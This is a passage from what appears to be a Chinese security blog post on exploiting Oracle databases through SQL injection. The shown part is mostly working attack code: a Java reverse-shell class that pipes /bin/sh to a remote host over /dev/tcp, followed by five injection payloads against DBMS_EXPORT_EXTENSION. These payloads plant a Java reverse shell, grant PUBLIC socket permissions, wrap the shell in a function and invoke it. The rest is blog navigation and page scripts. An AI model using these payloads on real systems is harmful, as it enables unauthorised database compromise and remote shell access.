+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.net.*;</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">shellRev</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span></span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">                System.out.println(<span class="number">1</span>);</span><br><span class="line">                <span class="keyword">try</span>&#123;run();&#125;</span><br><span class="line">                <span class="keyword">catch</span>(Exception e)&#123;&#125;</span><br><span class="line">        &#125;</span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">run</span><span class="params">()</span> <span class="keyword">throws</span> Exception</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">                String[] aaa=&#123;<span class="string">"/bin/bash"</span>,<span class="string">"-c"</span>,<span class="string">"exec 9&lt;&gt; /dev/tcp/192.168.1.50/8080;exec 0&lt;&amp;9;exec 1&gt;&amp;9 2&gt;&amp;1;/bin/sh"</span>&#125;;</span><br><span class="line">                Process p=Runtime.getRuntime().exec(aaa);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#编译</span></span><br><span class="line">javac shellRev.java</span><br><span class="line"><span class="comment">#执行</span></span><br><span class="line">java shellRev</span><br></pre></td></tr></table></figure>
+<h2 id="1-创建java代码"><a href="#1-创建java代码" class="headerlink" title="1. 创建java代码"></a>1. 创建java代码</h2><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> SYS.DBMS_EXPORT_EXTENSION.GET_DOMAIN_INDEX_TABLES(<span class="string">'FOO'</span>,<span class="string">'BAR'</span>,<span class="string">'DBMS_OUTPUT".PUT(:P1);EXECUTE IMMEDIATE ''DECLARE PRAGMA AUTONOMOUS_TRANSACTION;BEGIN EXECUTE IMMEDIATE ''''create or replace and compile java source named "shell" as import java.io.*;import java.net.*;public class shell &#123;public static void run() throws Exception&#123;String[] aaa=&#123;"/bin/bash","-c","exec 9&lt;&gt; /dev/tcp/127.0.0.1/8080;exec 0&lt;&amp;9;exec 1&gt;&amp;9 2&gt;&amp;1;/bin/sh"&#125;;Process p=Runtime.getRuntime().exec(aaa);&#125;&#125;'''';END;'';END;--'</span>,<span class="string">'SYS'</span>,<span class="number">0</span>,<span class="string">'1'</span>,<span class="number">0</span>) <span class="keyword">from</span> dual</span><br></pre></td></tr></table></figure>
+<h2 id="2-赋予java权限"><a href="#2-赋予java权限" class="headerlink" title="2. 赋予java权限"></a>2. 赋予java权限</h2><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> SYS.DBMS_EXPORT_EXTENSION.GET_DOMAIN_INDEX_TABLES(<span class="string">'FOO'</span>,<span class="string">'BAR'</span>,<span class="string">'DBMS_OUTPUT".PUT(:P1);EXECUTE IMMEDIATE ''DECLARE PRAGMA AUTONOMOUS_TRANSACTION;BEGIN EXECUTE IMMEDIATE ''''begin dbms_java.grant_permission( ''''''''PUBLIC'''''''', ''''''''SYS:java.net.SocketPermission'''''''', ''''''''&lt;&gt;'''''''', ''''''''*'''''''' );end;'''';END;'';END;--'</span>,<span class="string">'SYS'</span>,<span class="number">0</span>,<span class="string">'1'</span>,<span class="number">0</span>) <span class="keyword">from</span> dual</span><br></pre></td></tr></table></figure>
+<h2 id="3-创建函数-2"><a href="#3-创建函数-2" class="headerlink" title="3. 创建函数"></a>3. 创建函数</h2><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> SYS.DBMS_EXPORT_EXTENSION.GET_DOMAIN_INDEX_TABLES(<span class="string">'FOO'</span>,<span class="string">'BAR'</span>,<span class="string">'DBMS_OUTPUT" .PUT(:P1);EXECUTE IMMEDIATE ''DECLARE PRAGMA AUTONOMOUS_TRANSACTION;BEGIN EXECUTE IMMEDIATE ''''create or replace function reversetcp RETURN VARCHAR2 as language java name ''''''''shell.run() return String''''''''; '''';END;'';END;--'</span>,<span class="string">'SYS'</span>,<span class="number">0</span>,<span class="string">'1'</span>,<span class="number">0</span>) <span class="keyword">from</span> dual</span><br></pre></td></tr></table></figure>
+<h2 id="4-赋予函数执行权限-1"><a href="#4-赋予函数执行权限-1" class="headerlink" title="4. 赋予函数执行权限"></a>4. 赋予函数执行权限</h2><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> SYS.DBMS_EXPORT_EXTENSION.GET_DOMAIN_INDEX_TABLES(<span class="string">'FOO'</span>,<span class="string">'BAR'</span>,<span class="string">'DBMS_OUTPUT" .PUT(:P1);EXECUTE IMMEDIATE ''DECLARE PRAGMA AUTONOMOUS_TRANSACTION;BEGIN EXECUTE IMMEDIATE ''''grant all on reversetcp to public'''';END;'';END;--'</span>,<span class="string">'SYS'</span>,<span class="number">0</span>,<span class="string">'1'</span>,<span class="number">0</span>) <span class="keyword">from</span> dual</span><br></pre></td></tr></table></figure>
+<h2 id="5-反弹shell"><a href="#5-反弹shell" class="headerlink" title="5. 反弹shell"></a>5. 反弹shell</h2><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> sys.reversetcp <span class="keyword">from</span> dual</span><br></pre></td></tr></table></figure>
+<p><img src="reverse.png" alt="reverse"></p>
+<h1 id="0x04-参考链接"><a href="#0x04-参考链接" class="headerlink" title="0x04 参考链接"></a>0x04 参考链接</h1><blockquote>
+<p><a href="http://media.blackhat.com/bh-us-10/whitepapers/Siddharth/BlackHat-USA-2010-Siddharth-Hacking-Oracle-from-the-Web-wp.pdf" target="_blank" rel="noopener">Hacking Oracle from the Web</a><br><a href="http://www.usmacd.com/2017/10/11/oracle_run_os_cmd/" target="_blank" rel="noopener">Execute os command in Oracle Database</a><br><a href="https://www.iswin.org/2015/06/13/hack-oracle/" target="_blank" rel="noopener">Oracle Sql注入利用方法</a><br><a href="https://www.t00ls.net/thread-35507-1-1.html" target="_blank" rel="noopener">对ＸＸ站手工oracle注入到系统shell</a></p>
+</blockquote>
+
+    </div>
+
+    
+    
+    
+        
+
+<div>
+<ul class="post-copyright">
+  <li class="post-copyright-author">
+    <strong>本文作者： </strong>redn3ck
+  </li>
+  <li class="post-copyright-link">
+    <strong>本文链接：</strong>
+    <a href="https://redn3ck.github.io/2018/04/25/Oracle注入-命令执行-Shell反弹/" title="Oracle注入 - 命令执行&Shell反弹">https://redn3ck.github.io/2018/04/25/Oracle注入-命令执行-Shell反弹/</a>
+  </li>
+  <li class="post-copyright-license">
+    <strong>版权声明： </strong>本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh" rel="noopener" target="_blank"><i class="fab fa-fw fa-creative-commons"></i>BY-NC-SA</a> 许可协议。转载请注明出处！
+  </li>
+</ul>
+</div>
+
+
+      <footer class="post-footer">
+          
+          <div class="post-tags">
+              <a href="/tags/注入/" rel="tag"><i class="fa fa-tag"></i> 注入</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2018/04/19/双系统安装-win7下安装kali2-0/" rel="prev" title="双系统安装 - win7下安装kali2.0">
+      <i class="fa fa-chevron-left"></i> 双系统安装 - win7下安装kali2.0
+    </a></div>
+      <div class="post-nav-item">
+    <a href="/2018/07/22/安全狗绕过-本地中转bypass/" rel="next" title="安全狗绕过 - 本地中转bypass">
+      安全狗绕过 - 本地中转bypass <i class="fa fa-chevron-right"></i>
+    </a></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+    <div class="comments" id="valine-comments"></div>
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#0x01-Oracle安装"><span class="nav-text">0x01 Oracle安装</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#0x02-命令执行"><span class="nav-text">0x02 命令执行</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#方法1-DBMS-EXPORT-EXTENSION"><span class="nav-text">方法1. DBMS_EXPORT_EXTENSION()</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#使用java"><span class="nav-text">使用java</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#（1-创建Java库"><span class="nav-text">（1) 创建Java库</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#2-赋予Java权限"><span class="nav-text">(2) 赋予Java权限</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#3-创建函数"><span class="nav-text">(3) 创建函数</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#4-赋予函数执行权限"><span class="nav-text">(4) 赋予函数执行权限</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#5-执行"><span class="nav-text">(5) 执行</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#方法2-dbms-xmlquery-newcontext"><span class="nav-text">方法2. dbms_xmlquery.newcontext()</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#1-创建java包"><span class="nav-text">(1) 创建java包</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#2-赋予当前用户java权限"><span class="nav-text">(2) 赋予当前用户java权限</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#T00ls"><span class="nav-text">T00ls</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#随风’s-blog"><span class="nav-text">随风’s blog</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#3-创建函数-1"><span class="nav-text">(3) 创建函数</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#4-执行"><span class="nav-text">(4) 执行</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#方法3-DBMS-JAVA-TEST-FUNCALL"><span class="nav-text">方法3. DBMS_JAVA_TEST.FUNCALL()</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#使用java-privileges"><span class="nav-text">使用java privileges</span></a></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#0x03-反弹shell"><span class="nav-text">0x03 反弹shell</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#1-创建java代码"><span class="nav-text">1. 创建java代码</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#2-赋予java权限"><span class="nav-text">2. 赋予java权限</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#3-创建函数-2"><span class="nav-text">3. 创建函数</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#4-赋予函数执行权限-1"><span class="nav-text">4. 赋予函数执行权限</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#5-反弹shell"><span class="nav-text">5. 反弹shell</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#0x04-参考链接"><span class="nav-text">0x04 参考链接</span></a></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="redn3ck"
+      src="/images/blogAvatar2.jpg">
+  <p class="site-author-name" itemprop="name">redn3ck</p>
+  <div class="site-description" itemprop="description"></div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">14</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/tags/">
+          
+        <span class="site-state-item-count">21</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author motion-element">
+      <span class="links-of-author-item">
+        <a href="https://github.com/redn3ck" title="GitHub → https://github.com/redn3ck" rel="noopener" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="mailto:NjMwOTM2MTkxQHFxLmNvbQ==" title="E-Mail → mailto:NjMwOTM2MTkxQHFxLmNvbQ==" rel="noopener" target="_blank"><i class="fa fa-envelope fa-fw"></i>E-Mail</a>
+      </span>
+  </div>
+
+
+  <div class="links-of-blogroll motion-element">
+    <div class="links-of-blogroll-title"><i class="fa fa-link fa-fw"></i>
+      友情链接
+    </div>
+    <ul class="links-of-blogroll-list">
+        <li class="links-of-blogroll-item">
+          <a href="http://blog.qinqinyo.com" title="http://blog.qinqinyo.com" rel="noopener" target="_blank">Biglao</a>
+        </li>
+    </ul>
+  </div>
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 2018 – 
+  <span itemprop="copyrightYear">2020</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">redn3ck</span>
+</div>
+  <div class="powered-by">由 <a href="https://hexo.io" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.org" class="theme-link" rel="noopener" target="_blank">NexT.Gemini</a> 强力驱动
+  </div>
+
+        
+<div class="busuanzi-count">
+  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+    <span class="post-meta-item" id="busuanzi_container_site_uv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-user"></i>
+      </span>
+      <span class="site-uv" title="总访客量">
+        <span id="busuanzi_value_site_uv"></span>
+      </span>
+    </span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item" id="busuanzi_container_site_pv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-eye"></i>
+      </span>
+      <span class="site-pv" title="总访问量">
+        <span id="busuanzi_value_site_pv"></span>
+      </span>
+    </span>
+</div>
+
+
+
+
+
+
+<script>
+  (function() {
+    function leancloudSelector(url) {
+      url = encodeURI(url);
+      return document.getElementById(url).querySelector('.leancloud-visitors-count');
+    }
+
+    function addCount(Counter) {
+      var visitors = document.querySelector('.leancloud_visitors');
+      var url = decodeURI(visitors.id);
+      var title = visitors.dataset.flagTitle;
+
+      Counter('get', '/classes/Counter?where=' + encodeURIComponent(JSON.stringify({ url })))
+        .then(response => response.json())
+        .then(({ results }) => {
+          if (results.length > 0) {
+            var counter = results[0];
+            leancloudSelector(url).innerText = counter.time + 1;
+            Counter('put', '/classes/Counter/' + counter.objectId, { time: { '__op': 'Increment', 'amount': 1 } })
+              .catch(error => {
+                console.error('Failed to save visitor count', error);
+              });
+          } else {
+              leancloudSelector(url).innerText = 'Counter not initialized! More info at console err msg.';
+              console.error('ATTENTION! LeanCloud counter has security bug, see how to solve it here: https://github.com/theme-next/hexo-leancloud-counter-security. \n However, you can still use LeanCloud without security, by setting `security` option to `false`.');
+            
+          }
+        })
+        .catch(error => {
+          console.error('LeanCloud Counter Error', error);
+        });
+    }
+
+    function showTime(Counter) {
+      var visitors = document.querySelectorAll('.leancloud_visitors');
+      var entries = [...visitors].map(element => {
+        return decodeURI(element.id);
+      });
+
+      Counter('get', '/classes/Counter?where=' + encodeURIComponent(JSON.stringify({ url: { '$in': entries } })))
+        .then(response => response.json())
+        .then(({ results }) => {
+          for (let url of entries) {
+            let target = results.find(item => item.url === url);
+            leancloudSelector(url).innerText = target ? target.time : 0;
+          }
+        })
+        .catch(error => {
+          console.error('LeanCloud Counter Error', error);
+        });
+    }
+
+    let { app_id, app_key, server_url } = {"enable":true,"app_id":"EIDP7CTzy2rVnpTjoahW31sf-9Nh9j0Va","app_key":"34qnzvkVKBvjy44KTH7uurgw","server_url":null,"security":true};
+    function fetchData(api_server) {
+      var Counter = (method, url, data) => {
+        return fetch(`${api_server}/1.1${url}`, {
+          method,
+          headers: {
+            'X-LC-Id'     : app_id,
+            'X-LC-Key'    : app_key,
+            'Content-Type': 'application/json',
+          },
+          body: JSON.stringify(data)
+        });
+      };
+      if (CONFIG.page.isPost) {
+        if (CONFIG.hostname !== location.hostname) return;
+        addCount(Counter);
+      } else if (document.querySelectorAll('.post-title-link').length >= 1) {
+        showTime(Counter);
+      }
+    }
+
+    let api_server = app_id.slice(-9) !== '-MdYXbMMI' ? server_url : `https://${app_id.slice(0, 8).toLowerCase()}.api.lncldglobal.com`;
+
+    if (api_server) {
+      fetchData(api_server);
+    } else {
+      fetch('https://app-router.leancloud.cn/2/route?appId=' + app_id)
+        .then(response => response.json())
+        .then(({ api_server }) => {
+          fetchData('https://' + api_server);
+        });
+    }
+  })();
+</script>
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+<script src="/js/utils.js"></script><script src="/js/motion.js"></script>
+<script src="/js/schemes/pisces.js"></script>
+<script src="/js/next-boot.js"></script>
+
+
+
+  
+
+
+
+
+  <script src="/js/local-search.js"></script>
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+
+<script>
+NexT.utils.loadComments(document.querySelector('#valine-comments'), () => {
+  NexT.utils.getScript('//unpkg.com/valine/dist/Valine.min.js', () => {
+    var GUEST = ['nick', 'mail', 'link'];
+    var guest = 'nick,mail,link';
+    guest = guest.split(',').filter(item => {
+      return GUEST.includes(item);
+    });
+    new Valine({
+      el         : '#valine-comments',
+      verify     : false,
+      notify     : false,
+      appId      : 'EIDP7CTzy2rVnpTjoahW31sf-9Nh9j0Va',
+      appKey     : '34qnzvkVKBvjy44KTH7uurgw',
+      placeholder: "整点？",
+      avatar     : 'mm',
+      meta       : guest,
+      pageSize   : '10' || 10,
+      visitor    : false,
+      lang       : '' || 'zh-cn',
+      path       : location.pathname,
+      recordIP   : false,
+      serverURLs : ''
+    });
+  }, window.Valine);
+});
+</script>
+
+</body>
+</html>
